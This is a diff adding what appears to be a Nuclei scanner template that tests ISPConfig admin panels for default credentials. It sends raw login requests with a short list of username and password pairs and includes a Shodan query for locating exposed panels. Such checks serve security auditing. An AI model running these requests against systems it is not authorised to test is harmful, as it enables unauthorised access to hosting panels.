@@ -1,0 +1,63 @@
+id: ispconfig-admin-default-login
+
+info:
+  name: ISPConfig Admin - Default Password
+  author: pussycat0x
+  severity: high
+  description: |
+    ISPConfig Admin Default Password Vulnerability exposes systems to unauthorized access, compromising data integrity and security.
+  metadata:
+    verified: true
+    max-request: 9
+    shodan-query: "http.title:\"ispconfig\""
+  tags: default-login,ispconfig
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /login/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{BaseURL}}
+        Connection: close
+        Referer: {{RootURL}}/login/
+
+        username={{username}}&password={{password}}&s_mod=login&s_pg=index
+
+      - |
+        GET /sites/web_vhost_domain_list.php HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Referer: {{RootURL}}/index.php
+
+    attack: pitchfork
+    payloads:
+      username:
+        - 'admin'
+        - 'guest'
+        - 'root'
+      password:
+        - 'admin'
+        - 'password'
+        - 'toor'
+
+    stop-at-first-match: true
+    host-redirects: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_3
+        words:
+          - Tools
+          - Websites
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 490a0046304402203dc4145ba76f9fc3b13f814470541e7170c140a1e7c20426194670765b0c6347022028952a0fbba9b256be9f01e36fdcd8d442049cab56e4deb41bab435cad4714f5:922c64590222798bb761d5b6d8e72950
